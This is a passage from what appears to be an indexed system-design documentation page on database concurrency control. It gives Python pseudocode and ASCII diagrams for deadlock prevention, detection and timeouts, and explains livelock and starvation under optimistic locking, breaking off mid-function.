\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 After (No Deadlock):                                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 T1: Lock A \u2192 Lock B                      \u2502           \u2502\n\u2502 \u2502 T2: Lock A \u2192 Lock B  \u2713 (same order)     \u2502           \u2502\n\u2502 \u2502 Result: T2 waits for T1, NO DEADLOCK    \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 t1: T1 locks A                                          \u2502\n\u2502 t2: T2 tries to lock A \u2192 WAITS (T1 holds it)           \u2502\n\u2502 t3: T1 locks B                                          \u2502\n\u2502 t4: T1 commits, releases A and B                        \u2502\n\u2502 t5: T2 acquires A (unblocked)                           \u2502\n\u2502 t6: T2 locks B                                          \u2502\n\u2502 t7: T2 commits                                          \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code>def transfer_with_lock_ordering(db, from_account, to_account, amount):\n    \"\"\"Prevent deadlock by locking accounts in consistent order\"\"\"\n    db.begin()\n\n    # ALWAYS lock in ascending order (breaks circular wait!)\n    accounts = sorted([from_account, to_account])\n\n    # Lock first account\n    db.execute(\"\"\"\n        SELECT balance FROM accounts \n        WHERE id = ? \n        FOR UPDATE\n    \"\"\", [accounts[0]])\n\n    # Lock second account\n    db.execute(\"\"\"\n        SELECT balance FROM accounts \n        WHERE id = ? \n        FOR UPDATE\n    \"\"\", [accounts[1]])\n\n    # Now both accounts locked in consistent order\n    # No deadlock possible!\n\n    # Perform transfer\n    db.execute(\"\"\"\n        UPDATE accounts SET balance = balance - ?\n        WHERE id = ?\n    \"\"\", [amount, from_account])\n\n    db.execute(\"\"\"\n        UPDATE accounts SET balance = balance + ?\n        WHERE id = ?\n    \"\"\", [amount, to_account])\n\n    db.commit()\n    return True\n</code></pre> <p>Solution 2: Deadlock Detection &amp; Recovery</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    SOLUTION 2: DEADLOCK DETECTION (Detection &amp; Abort)   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Let deadlocks happen, DETECT and RESOLVE      \u2502\n\u2502                                                         \u2502\n\u2502 How it works:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. Database maintains wait-for graph     \u2502           \u2502\n\u2502 \u2502 2. Periodically check for cycles         \u2502           \u2502\n\u2502 \u2502 3. If cycle detected \u2192 DEADLOCK          \u2502           \u2502\n\u2502 \u2502 4. Choose victim transaction             \u2502           \u2502\n\u2502 \u2502 5. Abort victim, release its locks       \u2502           \u2502\n\u2502 \u2502 6. Other transactions proceed             \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Wait-For Graph:                                         \u2502\n\u2502                                                         \u2502\n\u2502   Before detection:                                     \u2502\n\u2502   \u250c\u2500\u2500\u2500\u2500\u2500\u2510 waits  \u250c\u2500\u2500\u2500\u2500\u2500\u2510                               \u2502\n\u2502   \u2502 T1  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502 T2  \u2502                               \u2502\n\u2502   \u2514\u2500\u2500\u252c\u2500\u2500\u2518        \u2514\u2500\u2500\u252c\u2500\u2500\u2518                               \u2502\n\u2502      \u2191              \u2502                                   \u2502\n\u2502      \u2502              \u2502 waits                             \u2502\n\u2502      \u2502              \u2193                                   \u2502\n\u2502      \u2502           \u250c\u2500\u2500\u2500\u2500\u2500\u2510                                \u2502\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 T3  \u2502                                \u2502\n\u2502        waits     \u2514\u2500\u2500\u2500\u2500\u2500\u2518                                \u2502\n\u2502                                                         \u2502\n\u2502   Cycle: T1 \u2192 T2 \u2192 T3 \u2192 T1 (DEADLOCK!)                 \u2502\n\u2502                                                         \u2502\n\u2502   After detection:                                      \u2502\n\u2502   - Abort T1 (victim chosen by cost)                    \u2502\n\u2502   - T2 and T3 can proceed                               \u2502\n\u2502                                                         \u2502\n\u2502 Victim Selection Criteria:                              \u2502\n\u2502 \u2022 Transaction with least work done                      \u2502\n\u2502 \u2022 Transaction with fewest locks held                    \u2502\n\u2502 \u2022 Transaction that has been aborted before (fairness)   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code># Database automatically detects and resolves deadlocks\n\ndef transfer_with_deadlock_retry(db, from_account, to_account, amount):\n    \"\"\"Handle deadlock with automatic retry\"\"\"\n\n    max_retries = 3\n\n    for attempt in range(max_retries):\n        try:\n            db.begin()\n\n            # Lock accounts (may cause deadlock)\n            db.execute(\"\"\"\n                SELECT balance FROM accounts \n                WHERE id = ? \n                FOR UPDATE\n            \"\"\", [from_account])\n\n            db.execute(\"\"\"\n                SELECT balance FROM accounts \n                WHERE id = ? \n                FOR UPDATE\n            \"\"\", [to_account])\n\n            # Perform transfer\n            db.execute(\"\"\"\n                UPDATE accounts SET balance = balance - ?\n                WHERE id = ?\n            \"\"\", [amount, from_account])\n\n            db.execute(\"\"\"\n                UPDATE accounts SET balance = balance + ?\n                WHERE id = ?\n            \"\"\", [amount, to_account])\n\n            db.commit()\n            return True\n\n        except DeadlockDetectedError as e:\n            # Database detected deadlock and aborted this transaction\n            db.rollback()\n            print(f\"Deadlock detected on attempt {attempt + 1}, retrying...\")\n            time.sleep(0.1 * (2 ** attempt))  # Exponential backoff\n            continue\n\n        except Exception as e:\n            db.rollback()\n            raise\n\n    return False  # Failed after retries\n</code></pre> <p>Solution 3: Timeout (Avoidance)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       SOLUTION 3: TIMEOUT (Deadlock Avoidance)          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Set maximum wait time for locks               \u2502\n\u2502                                                         \u2502\n\u2502 How it works:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. Transaction requests lock             \u2502           \u2502\n\u2502 \u2502 2. If not available, wait with timeout   \u2502           \u2502\n\u2502 \u2502 3. If timeout expires \u2192 ABORT             \u2502           \u2502\n\u2502 \u2502 4. Release all held locks                \u2502           \u2502\n\u2502 \u2502 5. Retry transaction                     \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 t1: T1 locks A                                          \u2502\n\u2502 t2: T2 locks B                                          \u2502\n\u2502 t3: T1 requests B \u2192 starts waiting (timeout=5s)         \u2502\n\u2502 t4: T2 requests A \u2192 starts waiting (timeout=5s)         \u2502\n\u2502 t8: T1 timeout! \u2192 ABORT, release A                      \u2502\n\u2502 t9: T2 acquires A, proceeds                             \u2502\n\u2502 t10: T1 retries (now can get both locks)                \u2502\n\u2502                                                         \u2502\n\u2502 Pros:                                                   \u2502\n\u2502 \u2022 Simple to implement                                   \u2502\n\u2502 \u2022 Guarantees no infinite wait                           \u2502\n\u2502                                                         \u2502\n\u2502 Cons:                                                   \u2502\n\u2502 \u2022 May abort transactions unnecessarily                  \u2502\n\u2502 \u2022 Difficult to set optimal timeout value                \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code>def transfer_with_timeout(db, from_account, to_account, amount):\n    \"\"\"Use lock timeout to avoid indefinite deadlock\"\"\"\n\n    # Set lock timeout (database-specific)\n    db.execute(\"SET lock_timeout = '5s'\")  # PostgreSQL\n    # or: SET innodb_lock_wait_timeout = 5;  -- MySQL\n\n    try:\n        db.begin()\n\n        # Try to acquire locks with timeout\n        db.execute(\"\"\"\n            SELECT balance FROM accounts \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [from_account])\n\n        db.execute(\"\"\"\n            SELECT balance FROM accounts \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [to_account])\n        # If timeout \u2192 LockTimeoutError raised\n\n        # Perform transfer\n        db.execute(\"\"\"\n            UPDATE accounts SET balance = balance - ?\n            WHERE id = ?\n        \"\"\", [amount, from_account])\n\n        db.execute(\"\"\"\n            UPDATE accounts SET balance = balance + ?\n            WHERE id = ?\n        \"\"\", [amount, to_account])\n\n        db.commit()\n        return True\n\n    except LockTimeoutError as e:\n        db.rollback()\n        print(\"Lock timeout - possible deadlock, retrying...\")\n        return False\n</code></pre> <p>Solution 4: Two-Phase Locking with Pre-Declaration</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   SOLUTION 4: PRE-DECLARATION (Prevention)              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Declare and lock ALL resources upfront        \u2502\n\u2502                                                         \u2502\n\u2502 How it works:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 1. List all needed resources before      \u2502           \u2502\n\u2502 \u2502    starting transaction                  \u2502           \u2502\n\u2502 \u2502 2. Acquire ALL locks at once             \u2502           \u2502\n\u2502 \u2502 3. If any lock unavailable \u2192 wait        \u2502           \u2502\n\u2502 \u2502 4. Only proceed when ALL acquired        \u2502           \u2502\n\u2502 \u2502 5. No additional locks during txn        \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Breaks: HOLD AND WAIT condition                         \u2502\n\u2502 (No holding while waiting for more)                     \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <pre><code>def transfer_with_predeclaration(db, from_account, to_account, amount):\n    \"\"\"Acquire all locks upfront\"\"\"\n    db.begin()\n\n    # Declare all accounts needed\n    accounts_needed = [from_account, to_account]\n\n    # Lock ALL accounts at once (in order)\n    for account_id in sorted(accounts_needed):\n        db.execute(\"\"\"\n            SELECT balance FROM accounts \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [account_id])\n\n    # All locks acquired! No more locking needed\n    # Cannot deadlock now\n\n    # Perform operations\n    db.execute(\"UPDATE accounts SET balance = balance - ? WHERE id = ?\",\n               [amount, from_account])\n    db.execute(\"UPDATE accounts SET balance = balance + ? WHERE id = ?\",\n               [amount, to_account])\n\n    db.commit()\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#52-deadlock-in-optimistic-concurrency-control","title":"5.2 Deadlock in Optimistic Concurrency Control","text":"<p>Description:</p> <p>Optimistic Concurrency Control does NOT have traditional deadlocks because it doesn't use locks! However, it can suffer from a related problem called livelock or starvation, where transactions repeatedly retry but never succeed.</p> <p>The False Sense of Security:</p> <p>When developers first learn about optimistic concurrency control, there's often a moment of relief: \"No locks? That means no deadlocks! Problem solved!\" Unfortunately, this celebration is premature. While optimistic control eliminates deadlocks (transactions blocking each other forever), it introduces a potentially worse problem: livelock (transactions actively retrying forever but never succeeding).</p> <p>Deadlock vs. Livelock - The Cruel Difference:</p> <p>Deadlock (pessimistic): - Transactions frozen, waiting - No CPU consumed (just waiting) - Easy to detect (wait-for graph) - Database can intervene (abort victim) - Visible problem (timeouts, monitoring alerts)</p> <p>Livelock (optimistic): - Transactions actively retrying - Massive CPU waste (work done, then discarded) - Hard to detect (transactions appear \"active\") - No automatic intervention (retry logic in application) - Invisible problem (looks like high load, not failure)</p> <p>The cruel irony: Livelock wastes more resources than deadlock because transactions keep doing work that gets thrown away, while deadlocked transactions at least have the decency to do nothing while blocked.</p> <p>Real-World Livelock Disaster:</p> <p>In 2015, a popular social media platform experienced a livelock storm:</p> <pre><code>Scenario: Trending post with millions of likes\n- 10,000 users click \"like\" simultaneously\n- All read current like_count (optimistic read)\n- All increment: like_count + 1\n- All try to commit with version check\n- First one succeeds, 9,999 fail\n- 9,999 retry immediately\n- Pattern repeats...\n\nResult:\n- 99.99% of work wasted\n- Server CPU at 100% (doing useless retries)\n- Like count increased by 1 (instead of 10,000)\n- Users saw \"Error: Please try again\" messages\n- 30 minutes to resolve (had to rate-limit API)\n</code></pre> <p>This is worse than deadlock because: 1. Servers appeared \"healthy\" (high CPU usage) 2. No automatic detection (monitoring showed \"active transactions\") 3. Massive resource waste (10,000x more work than needed) 4. User-facing failures (not transparent like deadlock abort)</p> <p>The Starvation Problem:</p> <p>Livelock often leads to starvation - some transactions never succeed:</p> <pre><code>Unfair scenario:\n- T1: Short transaction (10ms), high retry rate\n- T2: Long transaction (1000ms), low retry rate\n\nWhat happens:\n- T2 does 1000ms of work\n- T1 completes 100 times in same period (10ms \u00d7 100)\n- Every time T2 tries to commit, T1 has changed the data\n- T2 never succeeds (starved)\n</code></pre> <p>This violates fairness - some transactions are systematically disadvantaged.</p> <p>Why This is Harder to Debug:</p> <p>Deadlocks have clear symptoms: <pre><code>Database log: \"Deadlock detected, transaction T1 aborted\"\nApplication: Exception with clear error code\nMonitoring: Deadlock counter increments\n</code></pre></p> <p>Livelock symptoms are subtle: <pre><code>Database log: Nothing (just normal retries)\nApplication: Slow response times, eventual timeouts\nMonitoring: High CPU, low throughput (confusing!)\n</code></pre></p> <p>Developers often misdiagnose livelock as: - \"We need more servers\" (throwing hardware at algorithmic problem) - \"Database is slow\" (it's not - application retry logic is the issue) - \"Network problems\" (it's not - the conflict is local)</p> <p>The Mathematics of Livelock:</p> <p>With N concurrent transactions competing for same resource: - Success probability per transaction: 1/N - Expected retries: N-1 - Total work: O(N\u00b2) (N transactions \u00d7 N retries each) - Useful work: O(N) (N transactions succeed eventually) - Waste ratio: N/1 = N</p> <p>With 100 concurrent transactions: - 99% of work wasted - 100x more CPU consumed than needed</p> <p>This quadratic degradation is why optimistic control fails catastrophically under high contention.</p> <p>Livelock in Distributed Systems:</p> <p>The problem is even worse in distributed databases: - Higher latency per retry (network round trips) - More concurrent users (global scale) - Harder to coordinate retries (no central scheduler) - Exponentially more work wasted</p> <p>This is why distributed databases like Google Spanner use hybrid approaches: optimistic for low-contention paths, pessimistic locks for hot spots.</p> <p>Why No Deadlocks in Optimistic Control:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     OPTIMISTIC CONTROL - NO DEADLOCKS                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 No deadlocks because:                                   \u2502\n\u2502                                                         \u2502\n\u2502 \u2713 No locks acquired \u2192 No circular wait                  \u2502\n\u2502 \u2713 No holding resources \u2192 No hold-and-wait               \u2502\n\u2502 \u2713 Transactions don't block each other                   \u2502\n\u2502                                                         \u2502\n\u2502 Instead, we have:                                       \u2502\n\u2502 \u274c LIVELOCK (infinite retries)                          \u2502\n\u2502 \u274c STARVATION (transaction never commits)               \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Livelock Problem in Optimistic Control:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              LIVELOCK SCENARIO                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Problem: Transactions keep retrying but never succeed   \u2502\n\u2502                                                         \u2502\n\u2502 Time  T1                         T2                     \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2502\n\u2502 t1    Read: balance=1000, v=1                           \u2502\n\u2502 t2                                Read: balance=1000,v=1\u2502\n\u2502 t3    Modify: balance=500                               \u2502\n\u2502 t4                                Modify: balance=700   \u2502\n\u2502 t5    Validate \u2713, Commit                                \u2502\n\u2502       balance=500, v=2                                  \u2502\n\u2502 t6                                Validate \u2717 (v\u22601)      \u2502\n\u2502 t7                                RETRY                 \u2502\n\u2502 t8                                Read: balance=500,v=2 \u2502\n\u2502 t9    Read: balance=500, v=2                            \u2502\n\u2502 t10   Modify: balance=300                               \u2502\n\u2502 t11                               Modify: balance=200   \u2502\n\u2502 t12   Validate \u2713, Commit                                \u2502\n\u2502       balance=300, v=3                                  \u2502\n\u2502 t13                               Validate \u2717 (v\u22602)      \u2502\n\u2502 t14                               RETRY AGAIN...        \u2502\n\u2502 t15   (Pattern repeats...)        \u267e\ufe0f LIVELOCK!         \u2502\n\u2502                                                         \u2502\n\u2502 T2 never succeeds! (continuously retrying)              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Diagram - Livelock:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           LIVELOCK IN OPTIMISTIC CONTROL                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Multiple transactions competing for same resource:     \u2502\n\u2502                                                         \u2502\n\u2502  T1: \u2500\u2500[Read]\u2500\u2500[Modify]\u2500\u2500[Commit\u2713]\u2500\u2500[Read]\u2500\u2500[Commit\u2713]\u2500\u2192\u2502\n\u2502                                                         \u2502\n\u2502  T2: \u2500\u2500[Read]\u2500\u2500[Modify]\u2500\u2500[Abort\u2717]\u2500\u2500[Read]\u2500\u2500[Abort\u2717]\u2500\u2192  \u2502\n\u2502        \u2191                   \u2502         \u2191         \u2502        \u2502\n\u2502        \u2502                   \u2502         \u2502         \u2502        \u2502\n\u2502        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500RETRY\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500RETRY\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502  T3: \u2500\u2500[Read]\u2500\u2500[Modify]\u2500\u2500[Abort\u2717]\u2500\u2500[Read]\u2500\u2500[Abort\u2717]\u2500\u2192  \u2502\n\u2502                            \u2191                   \u2191        \u2502\n\u2502                            \u2514\u2500\u2500\u2500\u2500\u2500RETRY\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502  Problem: T2 and T3 keep retrying but keep failing      \u2502\n\u2502  (T1 keeps winning, others keep losing)                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code - Livelock Example:</p> <pre><code># Livelock scenario in optimistic control\n\ndef optimistic_transaction_livelock(db, account_id, amount):\n    \"\"\"\n    This transaction might experience livelock\n    if many other transactions compete for same account\n    \"\"\"\n\n    attempt = 0\n    while True:  # Infinite retry!\n        attempt += 1\n        